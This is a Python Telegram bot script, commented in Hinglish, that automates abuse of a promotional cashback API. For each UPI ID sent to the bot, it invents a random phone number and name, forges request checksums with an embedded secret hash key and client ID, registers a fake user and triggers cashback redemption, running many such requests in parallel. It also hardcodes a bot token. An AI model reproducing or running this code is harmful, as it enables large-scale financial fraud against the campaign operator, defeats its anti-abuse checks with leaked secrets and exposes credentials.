import telebot
import requests
import random
import hashlib
import json
from flask import Flask, request
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
API_TOKEN = '8095828135:AAFFmrU0Ze_0RJGNO9g2iO3jbYNp-t_BGeU'
CHANNEL_ID = '@Gost_Scripterr'
# Jab aap bot host karenge (e.g. Render par), toh wahan ka URL yahan daalein
WEBHOOK_URL = 'https://my-booster-bot.onrender.com/' 

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=15)

HASH_KEY = "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@"
CLIENT_ID = "LKnVCeozqpO9CIsMXW0yzHjkUFl4Njzh23qWAc9c2vg="
BASE_URL = "https://web.myfidelity.in/api/v1/parachute"

# --- Booster Logic ---
def gen_checksum(data_json, hash_key):
    s_hash = hashlib.sha256(hash_key.encode()).hexdigest()
    sorted_json = json.dumps(json.loads(data_json), separators=(',', ':'), sort_keys=True)
    combined = s_hash + sorted_json
    return hashlib.sha256(combined.encode()).hexdigest()

def process_boost(upi_id, chat_id):
    try:
        num = str(random.randint(6, 9)) + str(random.randint(100000000, 999999999))
        fname = random.choice(["Aarav","Aryan","Aditya","Amit","Ankit"])
        headers = {
            "Content-Type": "application/json",
            "msisdn": num,
            "clientId": CLIENT_ID,
            "appName": "Merico_Parachute",
            "appVersion": "1.0",
            "channel": "WEB",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
        }
        # Registration & Submit
        d1 = json.dumps({"msisdn": num, "firstName": fname, "lastName": "", "email": f"{fname.lower()}@gmail.com", "pinCode": "", "consent1": 1, "ssoId": "NA"})
        headers["checksum"] = gen_checksum(d1, HASH_KEY)
        requests.post(f"{BASE_URL}/save-user-detail", data=d1, headers=headers, timeout=5)

        d3 = json.dumps({"vpa": upi_id.strip()})
        headers["checksum"] = gen_checksum(d3, HASH_KEY)
        resp = requests.post(f"{BASE_URL}/save-upi-info", data=d3, headers=headers, timeout=5).json()

        if resp.get('status') == 'SUCCESS':
            d4 = json.dumps({"redemptionType": "CASHBACK"})
            headers["checksum"] = gen_checksum(d4, HASH_KEY)
            final = requests.post(f"{BASE_URL}/redemption", data=d4, headers=headers, timeout=5).json()
            bot.send_message(chat_id, f"✅ SUCCESS: {upi_id}\n{final.get('msg', 'Sent')}")
        else:
            bot.send_message(chat_id, f"❌ FAILED: {upi_id}")
    except:
        pass

# --- Bot Handlers ---
@bot.message_handler(func=lambda message: True)
def handle_upi(message):
    upi_list = [x.strip() for x in message.text.split("\n") if x.strip()]
    bot.reply_to(message, f"⚡ Fast Boosting Started for {len(upi_list)} IDs...")
    for upi in upi_list:
        executor.submit(process_boost, upi, message.chat.id)

# --- Webhook Routes ---
@app.route('/' + API_TOKEN, methods=['POST'])
def getMessage():
    bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
    return "!", 200

@app.route("/")
def webhook():
    bot.remove_webhook()
    bot.set_webhook(url=WEBHOOK_URL + API_TOKEN)
    return "Bot is Running with Webhook!", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
